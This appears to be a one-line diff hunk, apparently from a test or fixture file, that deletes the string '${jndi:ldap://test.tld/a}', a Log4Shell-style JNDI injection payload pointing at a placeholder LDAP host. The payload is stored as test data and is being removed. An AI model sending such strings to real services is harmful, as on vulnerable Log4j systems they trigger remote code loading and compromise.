@@ -1,1 +1,0 @@
-${jndi:ldap://test.tld/a}
